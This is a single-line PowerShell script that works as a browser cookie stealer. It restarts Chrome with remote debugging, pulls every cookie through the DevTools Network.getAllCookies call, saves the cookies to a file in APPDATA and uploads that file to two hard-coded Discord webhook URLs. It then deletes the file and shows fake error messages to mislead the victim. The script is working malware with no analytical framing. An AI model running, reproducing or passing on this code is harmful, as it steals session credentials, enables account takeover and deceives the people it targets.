$remoteDebuggingPort = 9222; function quitx(){ if (Get-Process -Name "chrome" -ErrorAction SilentlyContinue) { Stop-Process -Name "chrome" -Force } }; function SendReceiveWebSocketMessage { param ( [string] $WebSocketUrl, [string] $Message ) try { $WebSocket = [System.Net.WebSockets.ClientWebSocket]::new(); $CancellationToken = [System.Threading.CancellationToken]::None; $connectTask = $WebSocket.ConnectAsync([System.Uri] $WebSocketUrl, $CancellationToken); [void]$connectTask.Result; if ($WebSocket.State -ne [System.Net.WebSockets.WebSocketState]::Open) { throw "1" }; $messageBytes = [System.Text.Encoding]::UTF8.GetBytes($Message); $buffer = [System.ArraySegment[byte]]::new($messageBytes); $sendTask = $WebSocket.SendAsync($buffer, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $CancellationToken); [void]$sendTask.Result; $receivedData = New-Object System.Collections.Generic.List[byte]; $ReceiveBuffer = New-Object byte[] 4096; $ReceiveBufferSegment = [System.ArraySegment[byte]]::new($ReceiveBuffer); while ($true) { $receiveResult = $WebSocket.ReceiveAsync($ReceiveBufferSegment, $CancellationToken); if ($receiveResult.Result.Count -gt 0) { $receivedData.AddRange([byte[]]($ReceiveBufferSegment.Array)[0..($receiveResult.Result.Count - 1)]) }; if ($receiveResult.Result.EndOfMessage) { break } }; $ReceivedMessage = [System.Text.Encoding]::UTF8.GetString($receivedData.ToArray()); $WebSocket.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "1", $CancellationToken); return $ReceivedMessage } catch { throw $_ } }; quitx; $chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"; Start-Process -FilePath $chromePath -ArgumentList "https://google.com", "--remote-debugging-port=$remoteDebuggingPort", "--remote-allow-origins=ws://localhost:$remoteDebuggingPort" -PassThru; $jsonUrl = "http://localhost:$remoteDebuggingPort/json"; $jsonData = Invoke-RestMethod -Uri $jsonUrl -Method Get; $url_capture = $jsonData.webSocketDebuggerUrl; $Message = '{"id": 1,"method":"Network.getAllCookies"}'; $response = SendReceiveWebSocketMessage -WebSocketUrl $url_capture[-1] -Message $Message; quitx; $outputFile = Join-Path -Path $env:APPDATA -ChildPath "fas.json"; $response | Out-File -FilePath $outputFile; (Get-Content $outputFile | Select-Object -Skip 14) | Set-Content $outputFile; $cookies = Get-Content $outputFile -Raw; "1"; $webhookUrl = "https://discord.com/api/webhooks/1313206809963528263/oqwAuYboNSLvibUZi_pGUl56ONga0Ipco1AZ_Qxrob48RO6q2bv9Vynd6cTlDcTgyJSG"; $filePath = Join-Path -Path $env:APPDATA -ChildPath "fas.json"; function Send-FileToWebhook { param ( [string]$WebhookUrl, [string]$FilePath ) try { $fileStream = [System.IO.File]::OpenRead($FilePath); $fileName = [System.IO.Path]::GetFileName($FilePath); $formData = @{ file = New-Object System.Net.Http.StreamContent($fileStream) }; $formData["file"].Headers.Add("Content-Disposition", "form-data; name=`"file`"; filename=`"$fileName`""); $formData["file"].Headers.Add("Content-Type", "application/octet-stream"); $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $content.Add($formData["file"], "file", $fileName); $response = $client.PostAsync($WebhookUrl, $content).Result; if ($response.IsSuccessStatusCode) { Write-Host "File sent successfully to the webhook!" } else { Write-Host "Failed to send file. Status Code: $($response.StatusCode)" }; $fileStream.Close() } catch { Write-Host "An error occurred: $_" } }; Send-FileToWebhook -WebhookUrl $webhookUrl -FilePath $filePath; if (Test-Path $filePath) { Remove-Item $filePath -Force }; $0223 = "https://discord.com/api/webhooks/1303851019737763950/h7bJi7bR3EftOuBMYUSA2inDhw_224wlmKwQVeCHm6uqXoSYPMw7IRMXJidrDRifevst"; $filePath = Join-Path -Path $env:APPDATA -ChildPath "fas.json"; if (-not (Test-Path $filePath)) { Write-Host "1"; exit }; $boundary = [System.Guid]::NewGuid().ToString(); $eol = "`r`n"; $fileBytes = [System.IO.File]::ReadAllBytes($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $mimeType = "application/octet-stream"; $bodyLines = @( "--$boundary", "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`" ", "Content-Type: $mimeType", "", [System.Text.Encoding]::UTF8.GetString($fileBytes), "--$boundary--" ); $body = ($bodyLines -join $eol); $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body); try { $response = Invoke-RestMethod -Uri $0223 -Method Post -Body $bodyBytes -ContentType "multipart/form-data; boundary=$boundary"; Write-Host "error" } catch { Write-Host "error old windows version" }; if (Test-Path $filePath) { Remove-Item $filePath -Force; Write-Host "Error contact microsoft support, ERROR0292404" }
